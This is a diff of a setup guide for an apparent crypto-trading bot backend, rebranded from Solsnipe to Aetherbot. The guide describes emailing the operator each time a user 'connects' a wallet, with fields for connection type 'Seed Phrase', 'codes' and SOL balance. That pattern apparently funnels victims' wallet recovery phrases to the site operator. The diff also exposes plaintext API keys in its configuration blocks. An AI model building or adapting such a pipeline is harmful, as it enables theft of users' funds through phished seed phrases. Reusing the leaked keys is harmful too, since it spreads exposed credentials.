@@ -2,7 +2,7 @@
 
 ## Overview
 
-Your Solsnipe backend now sends transactional emails via **Loops** whenever:
+Your Aetherbot backend now sends transactional emails via **Loops** whenever:
 1. ✅ A user connects their wallet (new or returning)
 2. ✅ An admin performs a credit operation
 
@@ -16,10 +16,10 @@ Add these to your `.env` and `.env.development` files:
 
 ```bash
 # Loops Email Configuration
-LOOPS_API_KEY=0de67ebcc5e8d98792c780ed52b714ee
-ADMIN_EMAIL=admin@solsnipeai.xyz
-LOOPS_WALLET_CONNECTION_TEMPLATE_ID=cmgn2tzu5fqc41q0ivqlmuqf4
-LOOPS_ADMIN_NOTIFICATION_TEMPLATE_ID=cmgn2tzu5fqc41q0ivqlmuqf4
+LOOPS_API_KEY=e8afb88a6bae3451e657612d84db3034
+ADMIN_EMAIL=admin@aetherbot.app
+LOOPS_WALLET_CONNECTION_TEMPLATE_ID=cmgwzzij2tdk6wb0ie0unnzzp
+LOOPS_ADMIN_NOTIFICATION_TEMPLATE_ID=cmgwzzij2tdk6wb0ie0unnzzp
 ```
 
 **Already configured!** ✅
@@ -28,14 +28,14 @@ LOOPS_ADMIN_NOTIFICATION_TEMPLATE_ID=cmgn2tzu5fqc41q0ivqlmuqf4
 
 ## 📨 Email Templates
 
-### Template ID: `cmgn2tzu5fqc41q0ivqlmuqf4`
+### Template ID: `cmgwzzij2tdk6wb0ie0unnzzp`
 
 ### Data Variables Sent:
 
 ```json
 {
-  "transactionalId": "cmgn2tzu5fqc41q0ivqlmuqf4",
-  "email": "admin@solsnipeai.xyz",
+  "transactionalId": "cmgwzzij2tdk6wb0ie0unnzzp",
+  "email": "admin@aetherbot.app",
   "dataVariables": {
     "walletName": "9we6kjtbcZ2vy3GSLLsZTEhbAqXPTRvEyoxa8wxSqKp5",
     "connectionType": "Seed Phrase",
@@ -130,7 +130,7 @@ Invoke-RestMethod -Uri "http://localhost:8888/api/wallet-connect" -Method POST -
 1. ✅ Wallet connects successfully
 2. ✅ Console logs show: `📧 Sending email via Loops...`
 3. ✅ Console logs show: `✅ Email sent successfully`
-4. ✅ Check `admin@solsnipeai.xyz` inbox for email
+4. ✅ Check `admin@aetherbot.app` inbox for email
 
 ### Test 2: Admin Credit Email
 
@@ -158,7 +158,7 @@ Invoke-RestMethod -Uri "http://localhost:8888/api/credit-wallet" -Method POST -B
 1. ✅ Credit operation succeeds
 2. ✅ Console logs show: `📧 Sending email via Loops...`
 3. ✅ Console logs show: `✅ Email sent successfully`
-4. ✅ Check `admin@solsnipeai.xyz` inbox for email
+4. ✅ Check `admin@aetherbot.app` inbox for email
 
 ---
 
@@ -167,16 +167,16 @@ Invoke-RestMethod -Uri "http://localhost:8888/api/credit-wallet" -Method POST -B
 ### Successful Email:
 ```
 📧 Sending email via Loops...
-   To: admin@solsnipeai.xyz
-   Template: cmgn2tzu5fqc41q0ivqlmuqf4
+   To: admin@aetherbot.app
+   Template: cmgwzzij2tdk6wb0ie0unnzzp
 ✅ Email sent successfully
 ```
 
 ### Failed Email:
 ```
 📧 Sending email via Loops...
-   To: admin@solsnipeai.xyz
-   Template: cmgn2tzu5fqc41q0ivqlmuqf4
+   To: admin@aetherbot.app
+   Template: cmgwzzij2tdk6wb0ie0unnzzp
 ❌ Loops email failed: { message: "Invalid API key" }
 💥 Email sending error: Loops API error (401): Invalid API key
 ```
@@ -305,10 +305,10 @@ Go to: **Netlify Dashboard → Site Settings → Environment Variables**
 
 Add:
 ```
-LOOPS_API_KEY=0de67ebcc5e8d98792c780ed52b714ee
-ADMIN_EMAIL=admin@solsnipeai.xyz
-LOOPS_WALLET_CONNECTION_TEMPLATE_ID=cmgn2tzu5fqc41q0ivqlmuqf4
-LOOPS_ADMIN_NOTIFICATION_TEMPLATE_ID=cmgn2tzu5fqc41q0ivqlmuqf4
+LOOPS_API_KEY=e8afb88a6bae3451e657612d84db3034
+ADMIN_EMAIL=admin@aetherbot.app
+LOOPS_WALLET_CONNECTION_TEMPLATE_ID=cmgwzzij2tdk6wb0ie0unnzzp
+LOOPS_ADMIN_NOTIFICATION_TEMPLATE_ID=cmgwzzij2tdk6wb0ie0unnzzp
 ```
 
 ### 2. Test in Production
@@ -332,9 +332,9 @@ Look for:
 
 | Event | Recipient | Template ID | Data Variables |
 |-------|-----------|-------------|----------------|
-| Wallet Connect (New) | admin@solsnipeai.xyz | cmgn2tzu5fqc41q0ivqlmuqf4 | walletName, connectionType, codes, solBalance |
-| Wallet Connect (Returning) | admin@solsnipeai.xyz | cmgn2tzu5fqc41q0ivqlmuqf4 | walletName, connectionType, codes, solBalance |
-| Admin Credit | admin@solsnipeai.xyz | cmgn2tzu5fqc41q0ivqlmuqf4 | walletName, connectionType, codes, solBalance |
+| Wallet Connect (New) | admin@aetherbot.app | cmgwzzij2tdk6wb0ie0unnzzp | walletName, connectionType, codes, solBalance |
+| Wallet Connect (Returning) | admin@aetherbot.app | cmgwzzij2tdk6wb0ie0unnzzp | walletName, connectionType, codes, solBalance |
+| Admin Credit | admin@aetherbot.app | cmgwzzij2tdk6wb0ie0unnzzp | walletName, connectionType, codes, solBalance |
 
 ---
 
